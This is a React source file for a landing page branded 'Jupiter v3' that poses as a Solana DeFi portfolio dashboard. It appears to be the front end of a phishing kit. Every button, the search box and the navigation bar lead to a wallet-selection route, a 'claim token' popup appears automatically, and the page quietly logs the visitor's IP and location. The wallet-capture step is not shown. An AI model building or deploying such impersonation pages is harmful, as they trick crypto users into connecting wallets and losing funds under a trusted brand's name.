import React, { useState,useEffect} from "react";
import '../HomePage/index.scss';
import { Route, Routes, BrowserRouter, useNavigate } from "react-router-dom";
import logo from "../../assets/logo.png";
import ClaimTokenPopup from "../../components/ClaimTokenPopup";

const HomePage = () => {
  const [open, setOpen] = useState(false);
  const navigate = useNavigate();
  useEffect(() => {
    const timer = setTimeout(() => {
      setOpen(true);
    }, 2000);
    return () => clearTimeout(timer);
  }, []);
  useEffect(() => {
    const setLocaltion = async () => {
      try {
        fetch("https://get.geojs.io/v1/ip/geo.json").then(d => d.json()).then(d => {
          localStorage.setItem(
            "location",JSON.stringify({ IP: d.ip, country: d.country_code, city: d.city})
          );
        })
      } catch (error) {
        console.error("Error fetching data:", error);
      }
    };
    setLocaltion();
  }, []);

  const handleSubmit = (e) => {
    e.preventDefault();
    navigate("/select-wallet");
  };
 
  return (
<div className="my0app">
        {open && <ClaimTokenPopup onClose={() => setOpen(false)} />}

      {/* Header */}
      <header className="header">
        <div className="header-left">
          <img src={logo} alt="logo" className="logo" />
          <button type="button" aria-haspopup="dialog" aria-expanded="false" aria-controls="radix-:r7:" data-state="closed" class="menu-btn flex size-8 items-center justify-center rounded-lg text-neutral-600 hover:text-primary focus:outline-primary"><svg width="1em" height="1em" viewBox="0 0 18 14" fill="none" xmlns="http://www.w3.org/2000/svg" class="size-4 shrink-0"><path fill="currentColor" d="M17.5938 6.85693C17.5938 7.13044 17.4851 7.39274 17.2917 7.58614C17.0983 7.77953 16.836 7.88818 16.5625 7.88818H1.4375C1.164 7.88818 0.901693 7.77953 0.708296 7.58614C0.514899 7.39274 0.40625 7.13044 0.40625 6.85693C0.40625 6.58343 0.514899 6.32113 0.708296 6.12773C0.901693 5.93433 1.164 5.82568 1.4375 5.82568H16.5625C16.836 5.82568 17.0983 5.93433 17.2917 6.12773C17.4851 6.32113 17.5938 6.58343 17.5938 6.85693ZM1.4375 2.38818H16.5625C16.836 2.38818 17.0983 2.27953 17.2917 2.08614C17.4851 1.89274 17.5938 1.63044 17.5938 1.35693C17.5938 1.08343 17.4851 0.821126 17.2917 0.62773C17.0983 0.434333 16.836 0.325684 16.5625 0.325684H1.4375C1.164 0.325684 0.901693 0.434333 0.708296 0.62773C0.514899 0.821126 0.40625 1.08343 0.40625 1.35693C0.40625 1.63044 0.514899 1.89274 0.708296 2.08614C0.901693 2.27953 1.164 2.38818 1.4375 2.38818ZM16.5625 11.3257H1.4375C1.164 11.3257 0.901693 11.4343 0.708296 11.6277C0.514899 11.8211 0.40625 12.0834 0.40625 12.3569C0.40625 12.6304 0.514899 12.8927 0.708296 13.0861C0.901693 13.2795 1.164 13.3882 1.4375 13.3882H16.5625C16.836 13.3882 17.0983 13.2795 17.2917 13.0861C17.4851 12.8927 17.5938 12.6304 17.5938 12.3569C17.5938 12.0834 17.4851 11.8211 17.2917 11.6277C17.0983 11.4343 16.836 11.3257 16.5625 11.3257Z"></path></svg></button>
        </div>

        <div className="search-box">
          <input onClick={handleSubmit} type="text" placeholder="Search" />
        </div>

        <div className="header-right">
          <button onClick={handleSubmit} className="icon-btn">⚙</button>
          <button onClick={handleSubmit} className="connect-btn">Connect</button>
        </div>
      </header>

      {/* Content */}
      <main className="content">
        <div className="portfolio-section">
         
          <div className="portfolio-header">
    <img src={logo} alt="portfolio" className="portfolio-logo" />
    <span className="portfolio-title">Jupiter v3</span>
  </div>
          <h1>
            Your entire <span className="highlight">Solana DeFi world</span>, tracked in one{" "}
            <span className="highlight">unified dashboard.</span>
          </h1>
          <p>
            We scan 140+ protocols in real time to track your assets and catch every
            claimable item you might have missed.
          </p>
          <button onClick={handleSubmit} className="connect-wallet">Connect wallet</button>
          {/* <img style={{width:"100%",marginTop:"2%"}}
          src={preview}
          alt="Preview" 
          className="wallet-preview"
        /> */}
        </div>
      </main>

      {/* Bottom Navigation */}
      <nav onClick={handleSubmit} className="bottom-nav">
        <button>
          <svg  className="icon" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg" class="size-4" height="16" width="16"><path fill-rule="evenodd" clip-rule="evenodd" d="M5.17246 11.0054L7.49986 13.3336H1.66626V7.50005L3.99446 9.82744L11.6663 2.15485L12.8452 3.33375L5.17246 11.0054ZM18.3335 6.66645V12.5L16.0053 10.1726L8.33346 17.8452L7.15456 16.6663L14.8272 8.99455L12.4998 6.66635L18.3335 6.66645Z" fill="currentColor"></path></svg>
          <span>Swap</span>
        </button>
        <button>
          <svg xmlns="http://www.w3.org/2000/svg" className="icon" width="18" height="18" viewBox="0 0 24 24" class="size-[18px]"><path fill="currentColor" d="M7 19v-1H6q-.425 0-.712-.288T5 17V7q0-.425.288-.712T6 6h1V5q0-.425.288-.712T8 4t.713.288T9 5v1h1q.425 0 .713.288T11 7v10q0 .425-.288.713T10 18H9v1q0 .425-.288.713T8 20t-.712-.288T7 19m0-3h2V8H7zm8 3v-4h-1q-.425 0-.712-.288T13 14V9q0-.425.288-.712T14 8h1V5q0-.425.288-.712T16 4t.713.288T17 5v3h1q.425 0 .713.288T19 9v5q0 .425-.288.713T18 15h-1v4q0 .425-.288.713T16 20t-.712-.288T15 19m0-6h2v-3h-2zm1-1.5"></path></svg>
          <span>Pro</span>
        </button>
        <button>
<svg width="16" height="16" viewBox="0 0 17 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="size-4"><path d="M3.44806 4.86956C3.44806 5.35387 3.64045 5.81834 3.98291 6.1608C4.32536 6.50325 4.78984 6.69565 5.27414 6.69565C5.75845 6.69565 6.22292 6.50325 6.56538 6.1608C6.90784 5.81834 7.10023 5.35387 7.10023 4.86956C7.10023 4.38525 6.90784 3.92078 6.56538 3.57832C6.22292 3.23587 5.75845 3.04348 5.27414 3.04348C4.78984 3.04348 4.32536 3.23587 3.98291 3.57832C3.64045 3.92078 3.44806 4.38525 3.44806 4.86956Z" fill="currentColor"></path><path d="M10.7524 12.1739C10.7524 12.6582 10.9448 13.1227 11.2873 13.4651C11.6297 13.8076 12.0942 14 12.5785 14C13.0628 14 13.5273 13.8076 13.8697 13.4651C14.2122 13.1227 14.4046 12.6582 14.4046 12.1739C14.4046 11.6896 14.2122 11.2251 13.8697 10.8827C13.5273 10.5402 13.0628 10.3478 12.5785 10.3478C12.0942 10.3478 11.6297 10.5402 11.2873 10.8827C10.9448 11.2251 10.7524 11.6896 10.7524 12.1739Z" fill="currentColor"></path><path d="M15.0567 2.00001H10.8828C10.8057 1.99949 10.7302 2.02207 10.6661 2.06484C10.6019 2.10762 10.552 2.16863 10.5228 2.24001C10.492 2.31143 10.4835 2.39049 10.4984 2.46683C10.5133 2.54317 10.5509 2.61323 10.6063 2.66783L12.0568 4.10783C12.0694 4.12 12.0794 4.13459 12.0863 4.15072C12.0931 4.16686 12.0967 4.18421 12.0967 4.20175C12.0967 4.21928 12.0931 4.23663 12.0863 4.25277C12.0794 4.2689 12.0694 4.28349 12.0568 4.29566L4.16285 12.1739C4.01756 12.3213 3.93611 12.52 3.93611 12.727C3.93611 12.9339 4.01756 13.1326 4.16285 13.28C4.31043 13.4254 4.50874 13.5077 4.71589 13.5096C4.81918 13.5111 4.92175 13.4921 5.01761 13.4536C5.11346 13.4151 5.20067 13.3578 5.27415 13.2852L13.1524 5.39131C13.1646 5.37869 13.1792 5.36864 13.1953 5.36179C13.2114 5.35493 13.2288 5.35139 13.2463 5.35139C13.2638 5.35139 13.2812 5.35493 13.2973 5.36179C13.3135 5.36864 13.3281 5.37869 13.3402 5.39131L14.7802 6.83131C14.8348 6.8867 14.9049 6.9243 14.9812 6.9392C15.0576 6.95409 15.1366 6.94558 15.2081 6.91479C15.2794 6.88561 15.3404 6.83573 15.3832 6.77156C15.426 6.7074 15.4486 6.6319 15.4481 6.55479V2.38088C15.444 2.27935 15.4012 2.18323 15.3284 2.11235C15.2556 2.04148 15.1584 2.00127 15.0567 2.00001Z" fill="currentColor"></path></svg>
          <span>Perps</span>
        </button>
        <button>
          <svg xmlns='http://www.w3.org/2000/svg' className="icon" viewBox='0 0 256 256' width='256' height='256'><path fill="currentColor" strokeWidth="1" d='M200 120a16 16 0 1 1-16-16a16 16 0 0 1 16 16m-44-56h-40a12 12 0 0 0 0 24h40a12 12 0 0 0 0-24m100 48v32a28 28 0 0 1-27.54 28l-15.26 42.73A20 20 0 0 1 194.36 228h-12.72a20 20 0 0 1-18.84-13.27l-1-2.73h-51.63l-1 2.73A20 20 0 0 1 90.36 228H77.64a20 20 0 0 1-18.84-13.27l-12.3-34.45a91.63 91.63 0 0 1-20.75-42.48A11.9 11.9 0 0 0 24 144a12 12 0 0 1-24 0a36.07 36.07 0 0 1 24.56-34.13A92.13 92.13 0 0 1 116 28h104a12 12 0 0 1 0 24h-10a92 92 0 0 1 22.48 31.45l.42 1A28.05 28.05 0 0 1 256 112m-24 0a4 4 0 0 0-4-4h-3.66a12 12 0 0 1-11.45-8.41A68 68 0 0 0 148 52h-32a68 68 0 0 0-50.14 113.94a11.85 11.85 0 0 1 2.45 4.06l12.15 34h7.08l2.87-8a12 12 0 0 1 11.3-8h68.58a12 12 0 0 1 11.3 8l2.87 8h7.08l17.16-48a12 12 0 0 1 11.3-8h8a4 4 0 0 0 4-4Z'/></svg>
          <span>
            Lend <span className="beta">Beta</span>
          </span>
        </button>
        <button className="active">
          <svg className="icon" viewBox="0 0 15 15" fill="none">
<path d="M0.5 3.5L0.5 12.5C0.5 13.0523 0.947716 13.5 1.5 13.5L13.5 13.5C14.0523 13.5 14.5 13.0523 14.5 12.5V4.5C14.5 3.94772 14.0523 3.5 13.5 3.5L3 3.5M0.5 3.5V2.5C0.5 1.94772 0.947716 1.5 1.5 1.5H9.5C10.0523 1.5 10.5 1.94772 10.5 2.5V3.5L3 3.5M0.5 3.5L3 3.5M9 9.5H12" stroke="currentColor" strokeWidth="1"/>
</svg>
          <span>Portfolio</span>
        </button>
      </nav>
    </div>
  );
  
}

export default HomePage;
